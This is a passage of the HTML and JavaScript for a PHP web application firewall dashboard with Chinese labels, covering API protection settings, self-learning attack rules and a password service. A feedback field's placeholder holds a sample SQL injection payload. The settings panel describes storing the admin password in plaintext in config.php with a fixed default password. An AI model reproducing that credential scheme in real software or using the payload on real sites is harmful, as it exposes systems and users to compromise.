                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-algo" value="ES384" onchange="apiSaveConfig()"> ES384
                </label>
              </div>
            </div>
            <div>
              <div style="font-size:13px;font-weight:600;color:var(--text2);margin-bottom:10px">必须校验的 Claim</div>
              <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-claim" value="exp" onchange="apiSaveConfig()" checked> exp (过期时间)
                </label>
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-claim" value="nbf" onchange="apiSaveConfig()"> nbf (生效时间)
                </label>
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-claim" value="iss" onchange="apiSaveConfig()"> iss (签发者)
                </label>
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-claim" value="aud" onchange="apiSaveConfig()"> aud (受众)
                </label>
              </div>
            </div>
          </div>
          <div style="margin-top:16px">
            <div style="font-size:13px;font-weight:600;color:var(--text2);margin-bottom:10px">密钥配置</div>
            <div style="display:grid;grid-template-columns:1fr auto;gap:10px;align-items:center">
              <div style="position:relative">
                <input type="password" id="apiJwtSecret" placeholder="输入 JWT 签名密钥或公钥" style="width:100%;padding:8px 40px 8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none;font-family:monospace">
                <button onclick="apiToggleSecret()" style="position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:14px">👁️</button>
              </div>
              <button class="btn btn-primary" onclick="apiSaveConfig()">💾 保存</button>
            </div>
          </div>
          <div style="margin-top:16px;display:grid;grid-template-columns:1fr 1fr;gap:20px">
            <label style="display:flex;align-items:center;gap:10px;font-size:12px;color:var(--text2);cursor:pointer">
              <input type="checkbox" id="apiJwtBlockNone" onchange="apiSaveConfig()" checked>
              <div>
                <div style="font-weight:600">阻止 alg:none 攻击</div>
                <div style="font-size:11px;color:var(--text3)">拦截声明算法为 none 的令牌</div>
              </div>
            </label>
            <label style="display:flex;align-items:center;gap:10px;font-size:12px;color:var(--text2);cursor:pointer">
              <input type="checkbox" id="apiJwtKeyConfusion" onchange="apiSaveConfig()" checked>
              <div>
                <div style="font-weight:600">防密钥混淆攻击</div>
                <div style="font-size:11px;color:var(--text3)">防止 RS/HS 算法切换攻击</div>
              </div>
            </label>
          </div>
        </div>
      </div>

      <!-- API 速率限制卡片 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--green)"></span>API 速率限制</div>
          <label class="switch">
            <input type="checkbox" id="apiRateEnabled" onchange="apiSaveConfig()" checked>
            <span class="slider"></span>
          </label>
        </div>
        <div style="padding:16px">
          <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:16px">
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">每秒请求限制</label>
              <input type="number" id="apiRatePerSec" value="100" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">每分钟请求限制</label>
              <input type="number" id="apiRatePerMin" value="1000" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">每小时请求限制</label>
              <input type="number" id="apiRatePerHour" value="10000" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
          </div>
          <div style="font-size:13px;font-weight:600;color:var(--text2);margin-bottom:10px">白名单 IP（不限速，多个用逗号分隔）</div>
          <textarea id="apiRateWhitelist" placeholder="192.168.1.1, 10.0.0.0/8" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none;min-height:60px;resize:vertical;font-family:monospace"></textarea>
          <div style="margin-top:16px">
            <div style="font-size:13px;font-weight:600;color:var(--text2);margin-bottom:10px">超限动作</div>
            <div style="display:flex;gap:16px">
              <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                <input type="radio" name="apiRateAction" value="429" onchange="apiSaveConfig()" checked> 返回 429 Too Many Requests
              </label>
              <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                <input type="radio" name="apiRateAction" value="score" onchange="apiSaveConfig()"> 计入攻击评分
              </label>
              <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                <input type="radio" name="apiRateAction" value="ban" onchange="apiSaveConfig()"> 临时封禁 IP
              </label>
            </div>
          </div>
        </div>
      </div>

      <!-- GraphQL 防护卡片 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--pink)"></span>GraphQL 防护</div>
          <label class="switch">
            <input type="checkbox" id="apiGraphqlEnabled" onchange="apiSaveConfig()">
            <span class="slider"></span>
          </label>
        </div>
        <div style="padding:16px">
          <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:16px">
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">查询深度限制</label>
              <input type="number" id="apiGraphqlDepth" value="10" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">字段数量限制</label>
              <input type="number" id="apiGraphqlFields" value="50" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">复杂度限制</label>
              <input type="number" id="apiGraphqlComplexity" value="1000" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
            <label style="display:flex;align-items:center;gap:10px;font-size:12px;color:var(--text2);cursor:pointer">
              <input type="checkbox" id="apiGraphqlBlockIntrospection" onchange="apiSaveConfig()">
              <div>
                <div style="font-weight:600">禁用内省查询</div>
                <div style="font-size:11px;color:var(--text3)">阻止 __schema 和 __type 查询</div>
              </div>
            </label>
            <label style="display:flex;align-items:center;gap:10px;font-size:12px;color:var(--text2);cursor:pointer">
              <input type="checkbox" id="apiGraphqlBatchLimit" onchange="apiSaveConfig()" checked>
              <div>
                <div style="font-weight:600">批量查询限制</div>
                <div style="font-size:11px;color:var(--text3)">限制单请求中查询数量 ≤ 10</div>
              </div>
            </label>
          </div>
        </div>
      </div>

      <!-- WebSocket 防护卡片 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--yellow)"></span>WebSocket 防护</div>
          <label class="switch">
            <input type="checkbox" id="apiWsEnabled" onchange="apiSaveConfig()">
            <span class="slider"></span>
          </label>
        </div>
        <div style="padding:16px">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">消息速率限制（条/秒）</label>
              <input type="number" id="apiWsMsgRate" value="50" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">单帧大小限制（KB）</label>
              <input type="number" id="apiWsFrameSize" value="64" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
          </div>
          <label style="display:flex;align-items:center;gap:10px;font-size:12px;color:var(--text2);cursor:pointer">
            <input type="checkbox" id="apiWsOriginCheck" onchange="apiSaveConfig()" checked>
            <div>
              <div style="font-weight:600">Origin 校验</div>
              <div style="font-size:11px;color:var(--text3)">验证 WebSocket 连接的 Origin 头</div>
            </div>
          </label>
        </div>
      </div>

      <!-- 竞态条件防护卡片 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--orange)"></span>竞态条件防护</div>
          <label class="switch">
            <input type="checkbox" id="apiRaceEnabled" onchange="apiSaveConfig()">
            <span class="slider"></span>
          </label>
        </div>
        <div style="padding:16px">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">检测窗口（毫秒）</label>
              <input type="number" id="apiRaceWindow" value="100" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">相同请求阈值</label>
              <input type="number" id="apiRaceThreshold" value="5" onchange="apiSaveConfig()" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
          </div>
          <div>
            <div style="font-size:13px;font-weight:600;color:var(--text2);margin-bottom:10px">防护动作</div>
            <div style="display:flex;gap:16px">
              <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                <input type="radio" name="apiRaceAction" value="delay" onchange="apiSaveConfig()" checked> 延迟处理
              </label>
              <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                <input type="radio" name="apiRaceAction" value="reject" onchange="apiSaveConfig()"> 拒绝请求
              </label>
              <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                <input type="radio" name="apiRaceAction" value="log" onchange="apiSaveConfig()"> 仅记录
              </label>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ===== 自学习系统 ===== -->
    <div class="page" id="page-learn">
      <div class="kpi-grid">
        <div class="kpi-card" style="--card-grad:var(--grad-3)"><div class="kpi-value" id="learnPatterns">0</div><div class="kpi-label">自动学习规则</div></div>
        <div class="kpi-card" style="--card-grad:var(--grad-1)"><div class="kpi-value" id="learnNormal">0</div><div class="kpi-label">正常基线参数</div></div>
        <div class="kpi-card" style="--card-grad:var(--grad-2)"><div class="kpi-value" id="learnFeedback">0</div><div class="kpi-label">反馈修正次数</div></div>
        <div class="kpi-card" style="--card-grad:var(--grad-4)"><div class="kpi-value" id="learnAcc">99.9%</div><div class="kpi-label">识别准确率</div></div>
      </div>
      <div class="chart-row two">
        <div class="chart-card">
          <div class="card-head"><div class="card-title"><span class="dot"></span>学习趋势</div></div>
          <div class="chart-wrap"><canvas id="learnChart"></canvas></div>
        </div>
        <div class="chart-card">
          <div class="card-head"><div class="card-title"><span class="dot"></span>权重自适应</div></div>
          <div class="chart-wrap"><canvas id="weightChart"></canvas></div>
        </div>
      </div>

      <!-- 沙箱↔AutoLearn 联动状态 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--cyan)"></span>沙箱↔自学习 联动状态</div>
          <div><span class="tag green" id="couplingTag">联动: 开</span></div>
        </div>
        <div class="kpi-grid" style="margin-bottom:12px">
          <div class="kpi-card" style="--card-grad:var(--grad-4)"><div class="kpi-value" id="couplingEvents">0</div><div class="kpi-label">沙箱事件总数</div></div>
          <div class="kpi-card" style="--card-grad:var(--grad-3)"><div class="kpi-value" id="couplingIps">0</div><div class="kpi-label">高危 IP 数</div></div>
          <div class="kpi-card" style="--card-grad:var(--grad-1)"><div class="kpi-value" id="couplingHotSigs">0</div><div class="kpi-label">反哺特征数</div></div>
          <div class="kpi-card" style="--card-grad:var(--grad-2)"><div class="kpi-value" id="couplingFrozen">否</div><div class="kpi-label">行为基线冻结</div></div>
        </div>
        <table>
          <thead><tr><th>IP</th><th>事件数</th><th>最近触发</th><th>原因</th><th>最近文件</th></tr></thead>
          <tbody id="couplingIpsTable"><tr><td colspan="5" style="text-align:center;color:var(--text4);padding:30px">加载中...</td></tr></tbody>
        </table>
      </div>

      <!-- 学习规则详情 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--purple)"></span>已学习攻击规则</div>
          <div style="display:flex;gap:8px">
            <button class="btn" style="padding:6px 12px;font-size:12px" onclick="learnRefresh()">🔄 刷新</button>
            <button class="btn" style="padding:6px 12px;font-size:12px" id="learnFreezeBtn" onclick="learnFreezeToggle()">❄️ 冻结基线</button>
            <button class="btn btn-danger" style="padding:6px 12px;font-size:12px" onclick="learnReset()">🗑️ 重置全部</button>
          </div>
        </div>
        <div style="padding:8px 16px;color:var(--text3);font-size:12px;border-bottom:1px solid var(--border)">
          💡 当同一攻击载荷被记录 <b>≥3次</b> 时自动提取特征，<b>≥10次</b> 时升级严重度。点击「误报」可反馈并降低该类规则权重。
        </div>
        <table>
          <thead><tr><th>特征</th><th>类型</th><th>严重度</th><th>命中次数</th><th>学习时间</th><th>操作</th></tr></thead>
          <tbody id="learnRulesTable">
            <tr><td colspan="6" style="text-align:center;color:var(--text4);padding:30px">加载中...</td></tr>
          </tbody>
        </table>
      </div>

      <!-- 误报/漏报反馈 -->
      <div class="table-card">
        <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--green)"></span>误报/漏报反馈（训练WAF）</div></div>
        <div style="padding:12px 16px">
          <div style="color:var(--text3);font-size:12px;margin-bottom:10px">
            📝 提交被误判为攻击的正常请求（误报），或未被识别的攻击载荷（漏报），系统将自动调整对应攻击类型的权重。
          </div>
          <div style="margin-bottom:10px">
            <label style="font-size:12px;color:var(--text3)">载荷内容</label>
            <textarea id="learnFeedbackPayload" rows="3" placeholder="粘贴请求载荷，如：1' OR 1=1-- 或正常搜索关键词" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px;font-family:monospace;font-size:12px;resize:vertical"></textarea>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
            <div>
              <label style="font-size:12px;color:var(--text3)">反馈类型</label>
              <select id="learnFeedbackType" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px">
                <option value="false_positive">误报（正常被误判为攻击）</option>
                <option value="false_negative">漏报（攻击未被识别）</option>
              </select>
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3)">攻击类型（可选）</label>
              <select id="learnFeedbackAttackType" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px">
                <option value="">自动识别</option>
                <option value="sqli">SQL注入</option>
                <option value="xss">XSS跨站脚本</option>
                <option value="rce">远程代码执行</option>
                <option value="path_traversal">路径遍历</option>
                <option value="file_inclusion">文件包含</option>
                <option value="webshell">Webshell</option>
                <option value="xxe">XXE注入</option>
                <option value="ssrf">SSRF</option>
              </select>
            </div>
          </div>
          <div style="display:flex;gap:8px">
            <button class="btn btn-primary" onclick="learnSubmitFeedback()">📤 提交反馈</button>
            <button class="btn" onclick="document.getElementById('learnFeedbackPayload').value=''">清空</button>
          </div>
          <div id="learnFeedbackResult" style="margin-top:10px"></div>
        </div>
      </div>

      <!-- 权重调整详情 -->
      <div class="table-card">
        <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--yellow)"></span>攻击类型权重自适应</div></div>
        <div style="padding:8px 16px;color:var(--text3);font-size:12px;border-bottom:1px solid var(--border)">
          📊 基于近7天攻击趋势 + 反馈数据自动调整。基准权重 1.0，范围 0.5~2.0。
        </div>
        <table>
          <thead><tr><th>攻击类型</th><th>基准权重</th><th>当前权重</th><th>趋势调整</th><th>反馈调整</th></tr></thead>
          <tbody id="learnWeightsTable">
            <tr><td colspan="5" style="text-align:center;color:var(--text4);padding:30px">加载中...</td></tr>
          </tbody>
        </table>
      </div>
    </div>

    <!-- ===== 网站密码双重加密 ===== -->
    <div class="page" id="page-pwd-service">
      <div class="kpi-grid">
        <div class="kpi-card" style="--card-grad:var(--grad-3)"><div class="kpi-value" id="pwdSvcTotal">0</div><div class="kpi-label">总用户数</div></div>
        <div class="kpi-card" style="--card-grad:var(--grad-4)"><div class="kpi-value" id="pwdSvcUpgraded">0</div><div class="kpi-label">已升级双重加密</div></div>
        <div class="kpi-card" style="--card-grad:var(--grad-2)"><div class="kpi-value" id="pwdSvcStrong">0</div><div class="kpi-label">强加密 (bcrypt/argon)</div></div>
        <div class="kpi-card" style="--card-grad:var(--grad-1)"><div class="kpi-value" id="pwdSvcWeak">0</div><div class="kpi-label">弱加密 (md5/sha1)</div></div>
      </div>

      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--cyan)"></span>数据库连接配置</div>
          <div><span class="tag" id="pwdSvcStatus">未启用</span></div>
        </div>
        <div style="padding:12px 16px">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
            <div>
              <label style="font-size:12px;color:var(--text3)">数据库类型</label>
              <select id="pwdSvcDriver" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px">
                <option value="auto">自动检测</option>
                <option value="pdo_mysql">MySQL/MariaDB (PDO)</option>
                <option value="mysqli">MySQL/MariaDB (mysqli)</option>
                <option value="pdo_pgsql">PostgreSQL (PDO)</option>
                <option value="pdo_sqlite">SQLite (PDO)</option>
                <option value="sqlite3">SQLite3</option>
                <option value="pdo_sqlsrv">MSSQL/SQL Server (PDO)</option>
              </select>
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3)">用户表名</label>
              <input type="text" id="pwdSvcTable" placeholder="users" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px">
            </div>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px">
            <div><label style="font-size:12px;color:var(--text3)">主机</label><input type="text" id="pwdSvcHost" placeholder="localhost" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px"></div>
            <div><label style="font-size:12px;color:var(--text3)">端口</label><input type="text" id="pwdSvcPort" placeholder="3306" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px"></div>
            <div><label style="font-size:12px;color:var(--text3)">数据库名</label><input type="text" id="pwdSvcDb" placeholder="dbname" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px"></div>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">
            <div><label style="font-size:12px;color:var(--text3)">用户名</label><input type="text" id="pwdSvcUser" placeholder="user" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px"></div>
            <div><label style="font-size:12px;color:var(--text3)">密码</label><input type="password" id="pwdSvcPass" placeholder="password" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px"></div>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px">
            <div><label style="font-size:12px;color:var(--text3)">ID 列</label><input type="text" id="pwdSvcIdCol" placeholder="id" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px"></div>
            <div><label style="font-size:12px;color:var(--text3)">用户名列</label><input type="text" id="pwdSvcNameCol" placeholder="username" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px"></div>
            <div><label style="font-size:12px;color:var(--text3)">密码列</label><input type="text" id="pwdSvcPassCol" placeholder="password" style="width:100%;padding:8px;background:var(--bg2);border:1px solid var(--border2);color:var(--text);border-radius:4px"></div>
          </div>
          <div style="display:flex;gap:8px;margin-top:12px">
            <button class="btn btn-primary" onclick="pwdSvcTest()">🔌 测试连接</button>
            <button class="btn" onclick="pwdSvcSave()">💾 保存配置</button>
            <button class="btn btn-success" onclick="pwdSvcScanStats()">📊 扫描密码格式统计</button>
          </div>
          <div id="pwdSvcResult" style="margin-top:12px"></div>
        </div>
      </div>

      <div class="table-card">
        <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--green)"></span>密码格式分布</div></div>
        <table>
          <thead><tr><th>加密格式</th><th>估算数量</th><th>安全性</th></tr></thead>
          <tbody id="pwdSvcFormats">
            <tr><td colspan="3" style="text-align:center;color:var(--text4);padding:30px">请先配置并扫描</td></tr>
          </tbody>
        </table>
      </div>

      <div class="table-card">
        <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--yellow)"></span>集成代码</div></div>
        <div style="padding:12px 16px">
          <p style="color:var(--text3);font-size:12px;margin-bottom:8px">在你的网站代码中引入并使用密码服务：</p>
<pre style="background:var(--bg2);padding:12px;border-radius:4px;font-size:12px;overflow:auto;color:var(--cyan);font-family:monospace">require '/path/to/shield-waf/src/Password/PasswordService.php';

$svc = ShieldPasswordService::init([
    'driver'    => 'pdo_mysql',
    'host'      => 'localhost',
    'dbname'    => 'your_db',
    'username'  => 'user',
    'password'  => 'pass',
    'table'     => 'users',
    'id_col'    => 'id',
    'name_col'  => 'username',
    'pass_col'  => 'password',
]);

// 注册
$userId = $svc->register('user1', 'mypassword');

// 登录（旧密码自动升级）
$user = $svc->login('user1', 'mypassword');

// 修改密码
$svc->changePassword($userId, $oldPass, $newPass);</pre>
          <p style="color:var(--text3);font-size:12px;margin-top:12px">WordPress 用户只需一行：</p>
<pre style="background:var(--bg2);padding:12px;border-radius:4px;font-size:12px;overflow:auto;color:var(--cyan);font-family:monospace">require '/path/to/shield-waf/src/Password/WordPressIntegration.php';</pre>
        </div>
      </div>
    </div>

    <!-- ===== 系统设置 ===== -->
    <div class="page" id="page-settings">
      <div class="table-card">
        <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--cyan)"></span>系统配置 (实时读取 config.php)</div></div>
        <table>
          <thead><tr><th>配置项</th><th>当前值</th><th>说明</th></tr></thead>
          <tbody id="settingsTable">
            <tr><td colspan="3" style="text-align:center;color:var(--text4);padding:30px">加载中...</td></tr>
          </tbody>
        </table>
      </div>

      <!-- 密码管理 -->
      <div class="table-card">
        <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--purple)"></span>密码管理（WordPress 简化模式）</div></div>
        <table>
          <thead><tr><th>项目</th><th>当前值</th><th>说明</th></tr></thead>
          <tbody>
            <tr><td>密码模式</td><td><span class="tag green">simple</span></td><td>直接使用明文密码，无需复杂哈希</td></tr>
            <tr><td>是否自定义密码</td><td><span class="tag" id="pwdCustom">-</span></td><td>默认密码为 shield-waf-2026，建议修改</td></tr>
            <tr><td>配置文件</td><td><span style="font-family:monospace;font-size:11px">config.php</span></td><td>密码直接存储在配置文件中</td></tr>
          </tbody>
        </table>
        <div style="padding:12px 16px;display:flex;gap:8px;flex-wrap:wrap">
          <button class="btn" onclick="pwdTab('verify-current')">✓ 验证当前密码</button>
          <button class="btn btn-primary" onclick="pwdTab('change')">🔄 修改密码</button>
        </div>
        <div id="pwdPanel" style="padding:12px 16px;border-top:1px solid var(--border);min-height:120px"></div>
      </div>
    </div>

  </div>
</div>

<script>
// ========== 基础设置 ==========
window.WAF_CSRF_TOKEN = '<?php echo $csrf_token; ?>';
const colors = ['#ef4444','#f97316','#f59e0b','#10b981','#06b6d4','#3b82f6','#8b5cf6','#ec4899'];
let charts = {};

// ========== 数字滚动动画 ==========
function animateCountUp(element, target, duration){
  if(!element) return;
  const start = 0;
  const startTime = performance.now();
  const isFloat = !Number.isInteger(target);
  const decimals = isFloat ? (target.toString().split('.')[1]?.length || 1) : 0;

  function update(currentTime){
    const elapsed = currentTime - startTime;
    const progress = Math.min(elapsed / duration, 1);
    const easeOutQuart = 1 - Math.pow(1 - progress, 4);
    const current = start + (target - start) * easeOutQuart;
    element.textContent = isFloat ? current.toFixed(decimals) : Math.floor(current).toLocaleString();
    if(progress < 1) requestAnimationFrame(update);
  }
  requestAnimationFrame(update);
}

function animateCountForElement(el){
  if(el.dataset.countAnimated) return;
  const text = el.textContent.trim();
  let target = 0;
  const cleanText = text.replace(/[^0-9.]/g, '');
  if(cleanText){
    target = parseFloat(cleanText);
    if(!isNaN(target)){
      el.dataset.countAnimated = 'true';
      animateCountUp(el, target, 1500);
    }
  }
}

function initPageCountUps(pageId){
  const page = document.getElementById(pageId);
  if(!page) return;
  setTimeout(() => {
    page.querySelectorAll('.kpi-value, .hero-stat h4').forEach(el => {
      animateCountForElement(el);
    });
  }, 200);
}

// ========== 页面入场动画 ==========
function initPageAnimations(pageId){
  const page = document.getElementById(pageId);
  if(!page) return;
  const kpiCards = page.querySelectorAll('.kpi-card');
  kpiCards.forEach(card => card.classList.add('stagger-item'));
  const chartCards = page.querySelectorAll('.chart-card, .log-card, .table-card, .hero-grid > div');
  chartCards.forEach((card, i) => {
    card.classList.add('stagger-item');
    card.style.animationDelay = (0.25 + i * 0.1) + 's';
  });
  initPageCountUps(pageId);
}

// ========== 进度条动画 ==========
function animateProgressBar(bar, targetPercent){
  const fill = bar.querySelector('.progress-fill');
  if(!fill) return;
  setTimeout(() => { fill.style.width = targetPercent + '%'; }, 300);
}

// ========== 环形进度动画 ==========
function animateRingProgress(ring, targetValue){
  if(!ring) return;
  ring.classList.add('animate');
  ring.style.setProperty('--value', targetValue);
}

// ========== 生成迷你趋势图 SVG ==========
function createSparkline(data, color){
  if(!data || data.length < 2) return '';
  const w = 80, h = 24, pad = 2;
  const max = Math.max(...data), min = Math.min(...data);
  const range = max - min || 1;
  const stepX = (w - pad * 2) / (data.length - 1);
  const points = data.map((v, i) => {
    const x = pad + i * stepX;
    const y = h - pad - ((v - min) / range) * (h - pad * 2);
    return `${x.toFixed(1)},${y.toFixed(1)}`;
  }).join(' ');
  const firstX = pad, lastX = pad + (data.length - 1) * stepX;
  const areaPath = `M${firstX},${h-pad} L${points.replace(/ /g,' L')} L${lastX},${h-pad} Z`;
  return `<svg class="sparkline" viewBox="0 0 ${w} ${h}" preserveAspectRatio="none">
    <path class="spark-fill" d="${areaPath}" fill="${color}" opacity=".2"/>
    <path d="M${points.replace(/ /g,' L')}" stroke="${color}" fill="none"/>
  </svg>`;
}

// ========== Toast 通知（如已有则覆盖增强） ==========
if(typeof showToast !== 'function'){
  function showToast(msg, type){
    const toast = document.createElement('div');
    toast.style.cssText = 'position:fixed;top:80px;right:28px;z-index:9999;padding:12px 20px;border-radius:10px;font-size:13px;font-weight:500;animation:toastIn .3s ease;backdrop-filter:blur(12px);border:1px solid rgba(148,163,184,.1);';
    const colors = {
      success:'background:rgba(16,185,129,.15);color:#4ade80;border-color:rgba(16,185,129,.3);',
      error:'background:rgba(239,68,68,.15);color:#f87171;border-color:rgba(239,68,68,.3);',
      info:'background:rgba(6,182,212,.15);color:#22d3ee;border-color:rgba(6,182,212,.3);',
      warning:'background:rgba(245,158,11,.15);color:#fbbf24;border-color:rgba(245,158,11,.3);'
    };
    toast.style.cssText += colors[type] || colors.info;
    toast.textContent = msg;
    document.body.appendChild(toast);
    setTimeout(() => {
      toast.style.animation = 'toastOut .3s ease forwards';
      setTimeout(() => toast.remove(), 300);
    }, 2500);
  }
}

// 注入 toast 动画
const toastStyle = document.createElement('style');
toastStyle.textContent = `
@keyframes toastIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
@keyframes toastOut{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(20px)}}
`;
document.head.appendChild(toastStyle);

// ========== 侧边栏导航 ==========
document.querySelectorAll('.nav-item').forEach(item => {
  item.addEventListener('click', () => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    item.classList.add('active');
    const page = item.dataset.page;
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const targetPage = document.getElementById('page-' + page);
    if(targetPage){
      targetPage.classList.remove('active');
      void targetPage.offsetWidth;
      targetPage.classList.add('active');
    }
    const titles = {overview:'安全总览',attacks:'攻击日志',bots:'机器人防护',firewall:'IP 管理',rules:'防护中心',semantic:'语义引擎',sandbox:'沙箱中心','false-positive':'误报中心','api-security':'API 安全',learn:'自学习系统',settings:'系统设置'};
    document.getElementById('pageTitle').textContent = titles[page] || '安全总览';
    if(page==='overview') loadOverview();
    if(page==='attacks') loadAllAttacks();
    if(page==='bots') initBotPage();
    if(page==='firewall') loadFirewall();
    if(page==='semantic') loadSemantic();
    if(page==='sandbox'){ loadSandbox(); initSandboxEnhancements(); }
    if(page==='learn') loadLearn();
    if(page==='settings') loadSettings();
    if(page==='false-positive') loadFalsePositive();
    if(page==='api-security') loadApiSecurity();
    if(page==='rules') loadProtectCenter();
    initPageAnimations('page-' + page);
  });
});

// ========== 时钟 ==========
function updateClock(){
  const d = new Date();
  document.getElementById('clock').textContent = d.toLocaleString('zh-CN',{hour12:false});
  document.getElementById('verTime').textContent = d.toLocaleTimeString('zh-CN',{hour12:false});
}
